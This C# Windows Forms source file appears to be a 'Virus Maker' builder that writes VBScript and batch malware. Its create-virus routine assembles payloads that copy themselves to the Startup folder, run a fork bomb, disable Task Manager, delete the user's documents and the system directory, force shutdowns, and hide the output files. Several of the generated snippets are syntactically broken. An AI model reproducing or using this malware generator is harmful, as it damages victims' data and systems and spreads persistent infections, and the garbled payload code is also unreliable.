using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace VirusMaker
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();

            string applicationDirectory = Application.StartupPath;
            saveLocation_Display.Text = applicationDirectory;
        }

        // GLOBALS
        string newLine = Environment.NewLine;
        bool defaultNameUsed = false;

        // SAVE + DELETE BUTTONS
        private void saveLocationBtn_Click(object sender, EventArgs e)
        {
            try
            {
                FolderBrowserDialog selectFileDialog = new FolderBrowserDialog();
                DialogResult result = selectFileDialog.ShowDialog();
                string folderName = selectFileDialog.SelectedPath;

                if (result == DialogResult.OK)
                {
                    saveLocation_Display.Text = folderName;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                msgLog.Text += "An error occured." + newLine;
            }
        }

        private void dltLastSaveBtn_Click(object sender, EventArgs e)
        {
            string virusFilePathBatch = saveLocation_Display.Text + "\\" + virusName.Text + "_extra.bat";
            string virusFilePathVBS = saveLocation_Display.Text + "\\" + virusName.Text + ".vbs";

            try
            {
                if (virusName.Text.Trim().Length > 0)
                {
                    if (File.Exists(virusFilePathVBS))
                    {
                        System.IO.File.Delete(virusFilePathVBS);
                        msgLog.Text += virusName.Text + ".vbs successfully deleted." + newLine;
                    }
                    else if (File.Exists(virusFilePathVBS) == false)
                    {
                        MessageBox.Show(virusFilePathVBS + " doesn't exist.", "Unable to Delete", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        msgLog.Text += virusName.Text + ".vbs doesn't exist." + newLine;
                    }
                    if (File.Exists(virusFilePathBatch))
                    {
                        System.IO.File.Delete(virusFilePathBatch);
                        msgLog.Text += virusName.Text + "_extra.bat successfully deleted." + newLine;
                    }
                    else if (File.Exists(virusFilePathBatch) == false)
                    {
                        MessageBox.Show(virusFilePathBatch + " doesn't exist.", "Unable to Delete", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        msgLog.Text += virusName.Text + "_extra.bat doesn't exist." + newLine;
                    }
                }
                else if (virusName.Text.Trim().Length == 0)
                {
                    DialogResult result = MessageBox.Show("Please enter the name of a previous virus.", "Virus Name Null", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    if (result == DialogResult.OK)
                    {
                        virusName.Select();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                msgLog.Text += "An error occured." + newLine;
            }
        }

        // CLEAR SETTINGS BUTTON
        private void clearSettingsBtn_Click(object sender, EventArgs e)
        {
            // Old broken code
            //foreach (Control control in splitContainer1.Panel2.Controls)
            //{
            //    if (control is GroupBox)
            //    {
            //        foreach (Control child in (control as GroupBox).Controls)
            //        {
            //            if (child is CheckBox)
            //            {
            //                ((CheckBox)control).Checked = false;
            //            }
            //            else if (child is TextBox)
            //            {
            //                (control as TextBox).Clear();
            //            }
            //        }
            //    }
            //}

            string currentSaveLocation = saveLocation_Display.Text; // temporary fix to stop certain textboxes resetting
            string messageLog = msgLog.Text;
            ClearForm(this);
            saveLocation_Display.Text = currentSaveLocation;
            msgLog.Text = messageLog;
        }
        public static void ClearForm(System.Windows.Forms.Control parent) // method to clear form
        {
            foreach (System.Windows.Forms.Control ctrControl in parent.Controls)
            {
                if (object.ReferenceEquals(ctrControl.GetType(), typeof(System.Windows.Forms.TextBox)))
                {
                    ((System.Windows.Forms.TextBox)ctrControl).Clear();
                }
                else if (object.ReferenceEquals(ctrControl.GetType(), typeof(System.Windows.Forms.CheckBox)))
                {
                    ((System.Windows.Forms.CheckBox)ctrControl).Checked = false;
                }
                else if (object.ReferenceEquals(ctrControl.GetType(), typeof(System.Windows.Forms.NumericUpDown)))
                {
                    ((System.Windows.Forms.NumericUpDown)ctrControl).Value = 0;
                }

                if (ctrControl.Controls.Count > 0)
                {
                    //Call itself to get all other controls in other containers 
                    ClearForm(ctrControl);
                }
            }
        }

        // CREATE VIRUS BUTTON
        private void createVirusBtn_Click(object sender, EventArgs e)
        {
            // Check whether custom code box meets parameters
            bool customCodeCheck = false;
            if (customCodeLang.Text.ToUpper() == "VBSCRIPT" || customCodeLang.Text.ToUpper() == "BATCH")
            {
                customCodeCheck = true;
            }
            if (customCode.Text.Trim().Length > 0 && customCodeCheck == false)
            {
                    MessageBox.Show("Please make sure that you have selected either 'VBScript' or 'Batch' in the custom code section.", "Invalid Custom Code", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else // Main code
            {
                try
                {
                    string batchContentsMain = "REM Made with Virus Maker (Pre-Release v0.7)" + newLine + newLine + "@echo off" + newLine;
                    string batchContentsLoop = ":start" + newLine;

                    string vbsContentsMain = "'Made with Virus Maker (Pre-Release v0.7)" + newLine + newLine;

                    // Startup setup
                    if (copyToStartup_CB.Checked)
                    {
                        batchContentsMain += "REM Copy to startup" + newLine
                            + "copy \"" + virusName.Text + "_extra.bat\" \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\\"" + newLine
                            + "copy \"" + virusName.Text + ".vbs\" \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"" + newLine + newLine;
                        MessageBox.Show(batchContentsMain);
                    }

                    //  Just for fun group
                    if (swapMouseBtn_CB.Checked)
                    {
                        batchContentsMain += "REM Swap mouse buttons" + newLine
                            + "Rundll32 user32,SwapMouseButton";
                    }
                    if (openCloseCD_CB.Checked)
                    {
                        vbsContentsMain += "'-- Open/Close CD Drive --" + newLine
                            + "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" + newLine
                            + "Set colCDROMs = oWMP.cdromCollection" + newLine
                            + "if colCDROMs.Count >= 1 then" + newLine
                            + "do" + newLine
                            + "For i = 0 to colCDROMs.Count - 1" + newLine
                            + "colCDROMs.Item(i).Eject" + newLine
                            + "Next ' cdrom" + newLine
                            + "For i = 0 to colCDROMs.Count - 1" + newLine
                            + "colCDROMs.Item(i).Eject" + newLine
                            + "Next ' cdrom" + newLine
                            + "Loop" + newLine
                            + "End If" + newLine + newLine;
                    }
                    if (minimiseWindows_CB.Checked)
                    {
                        vbsContentsMain += "'-- Minimize all windows --" + newLine;
                        vbsContentsMain += "Do While true" + newLine
                            + "set objShell = CreateObject(\"shell.application\")" + newLine
                            + "objShell.ToggleDesktop" + newLine
                            + "Loop" + newLine + newLine;
                    }
                    if (bombDesktop_CB.Checked)
                    {
                        batchContentsLoop += "REM Fork bomb"
                            + "REM Fork bomb" + newLine
                            + "start %0" + newLine
                            + "%0|%0" + newLine;
                    }
                    if (spamErrorTitle_Input.Text.Trim().Length > 0 || spamErrorMsg_Input.Text.Trim().Length > 0)
                    {
                        if (spamErrorTitle_Input.Text.Trim().Length > 0 && spamErrorMsg_Input.Text.Trim().Length > 0)
                        {
                            string spamErrorTitle = spamErrorTitle_Input.Text;
                            string spamErrorMsg = spamErrorMsg_Input.Text;

                            vbsContentsMain += "'--Spam with error message--" + newLine
                                + "do" + newLine
                                + "x=msgbox(\"" + spamErrorMsg + "\" ,16, \"" + spamErrorTitle + "\")" + newLine
                                + "msgCount += 1" + newLine
                                + "loop until msgCount = 20" + newLine + newLine; // set limit of message boxes to 20
                        }
                        else if (spamErrorTitle_Input.Text.Trim().Length == 0)
                        {
                            MessageBox.Show("You are missing a title for the fake error messages.");
                            spamErrorTitle_Input.Select();
                            return; // breaks event if title missing
                        }
                        else if (spamErrorMsg_Input.Text.Trim().Length == 0)
                        {
                            MessageBox.Show("You are missing a message for the fake error messages.");
                            spamErrorMsg_Input.Select();
                            return;
                        }
                    }

                    // Harmful group
                    if (disableTaskMng_CB.Checked)
                    {
                        vbsContentsMain += "-- Disable Task Manager --"
                            + "Shell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr\", 1, \"REG_DWORD\""
                            + newLine + newLine;
                    }
                    if (dltMyDocuments_CB.Checked)
                    {
                        vbsContentsMain += "'-- Delete my documents --"
                            + "GET-CHILDITEM \"$HOME\\My Documents\" -recurse | Remove-ITEM" + newLine + newLine;
                    }
                    if (dltSystem32_CB.Checked)
                    {
                        vbsContentsMain += "'-- Delete System32 --"
                            + "Dim FSO, folder" + newLine
                            + "set shell = WScript.CreateObject(\"WScript.Shell\")" + newLine
                            + "folder = shell.ExpandEnvironmentStrings(\"%systemdir%\")" + newLine
                            + "set FSO = CreateObject(\"Scripting.FileSystemObject\")" + newLine
                            + "FSO.DeleteFolder(folder)" + newLine + newLine;
                    }

                    // Other options
                    if (shutdownComp_CB.Checked)
                    {
                        string shutdownWait = Convert.ToString(timeToWait_Value.Value);

                        vbsContentsMain += "'-- Shutdown computer --" + newLine
                            + "set objShell = CreateObject(\"WScript.Shell\")" + newLine
                            + "strShutdown = \"shutdown -s -t " + shutdownWait + " -f -m \"" + newLine
                            + "objShell.Run strShutdown" + newLine + newLine;
                        MessageBox.Show(vbsContentsMain);
                    }
                    if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "VBSCRIPT")
                    {
                        vbsContentsMain += "'-- Custom code --" + newLine
                            + customCode.Text + newLine;
                    }
                    else if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "BATCH")
                    {
                        batchContentsMain += "REM Custom code" + newLine
                            + customCode.Text + newLine;
                    }

                    batchContentsLoop += "goto start" + newLine;

                    // File creation
                    string finalBatchContents = batchContentsMain + batchContentsLoop; // merger of batch content

                    string vbsSavePath = saveLocation_Display.Text + "\\Virus Maker Output\\";
                    string batchSavePath = saveLocation_Display.Text + "\\Virus Maker Output\\";

                    if (virusName.Text.Trim().Length == 0 )
                    {
                        DialogResult result = MessageBox.Show("The virus name field is blank, do you want the default name to be used?",
                            "Virus Name Invalid", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                        if (result == DialogResult.Yes)
                        {
                            vbsSavePath += "myVirus.vbs";
                            batchSavePath += "myVirus_extra.bat";
                            defaultNameUsed = true;
                        }
                        else if (result == DialogResult.No)
                        {
                            virusName.Select();
                            return;
                        }
                    }
                    else if (virusName.Text.Trim().Length > 0)
                    {
                        vbsSavePath += virusName.Text + ".vbs";
                        batchSavePath += virusName.Text + "_extra.bat";
                    }

                    // Folder exists check
                    string virusMakerFolder = saveLocation_Display.Text + "\\Virus Maker Output";
                    if (File.Exists(virusMakerFolder) == false)
                    {
                        System.IO.Directory.CreateDirectory(virusMakerFolder);
                    }

                    // Stream writer
                    try
                    {
                        System.IO.StreamWriter vbsWriter;
                        vbsWriter = new System.IO.StreamWriter(vbsSavePath);
                        vbsWriter.Write(vbsContentsMain);
                        vbsWriter.Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        msgLog.Text += "Could not write VBScript file." + newLine;
                    }

                    try
                    {
                        System.IO.StreamWriter batchWriter;
                        batchWriter = new System.IO.StreamWriter(batchSavePath);
                        batchWriter.Write(finalBatchContents);
                        batchWriter.Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        msgLog.Text += "Could not write Batch file." + newLine;
                    }

                    // File attribute settings
                    if (readOnly_CB.Checked)
                    {
                        File.SetAttributes(vbsSavePath, File.GetAttributes(vbsSavePath) | FileAttributes.ReadOnly);
                        File.SetAttributes(batchSavePath, File.GetAttributes(batchSavePath) | FileAttributes.ReadOnly);
                    }
                    if (fileVisibility.Text.ToUpper() != "VISIBLE")
                    {
                        if (fileVisibility.Text.ToUpper() == "HIDDEN")
                        {
                            File.SetAttributes(vbsSavePath, File.GetAttributes(vbsSavePath) | FileAttributes.Hidden);
                            File.SetAttributes(batchSavePath, File.GetAttributes(batchSavePath) | FileAttributes.Hidden);
                        }
                        else if (fileVisibility.Text.ToUpper() != "HIDDEN")
                        {
                            DialogResult result = MessageBox.Show("The file visibility is not set to either 'visible' or 'hidden'. Would you like to correct this?" + newLine + "If no, any file visibility options will be ignored.",
                            "Invalid Submission", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (result == DialogResult.Yes)
                            {
                                fileVisibility.Select();
                                return;
                            }
                        }
                    }
                    
                    // Succession message
                    MessageBox.Show("Virus Successfully created at:" + newLine + virusMakerFolder, "Operation Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    if (defaultNameUsed) // adjust msgLog depending on defualtNameUsed
                    {
                        msgLog.Text += "Your virus was successfully created." + newLine;
                    }
                    else if (defaultNameUsed == false)
                    {
                        msgLog.Text += "'" + virusName.Text + "' successfully created." + newLine;
                    }

                    defaultNameUsed = false; // reset bool
                }
                catch (Exception ex) // catch for overall button code
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    msgLog.Text += "An error occured." + newLine;
                }
            }
            
        }

        // Delete startup files remove shortcut
        DeleteStartupDialog deleteStartupWindow = new DeleteStartupDialog();
        private void MainForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.D && e.Modifiers == (Keys.Control))
            {
                deleteStartupWindow.ShowDialog();
            }
        }

        
     
    }
}
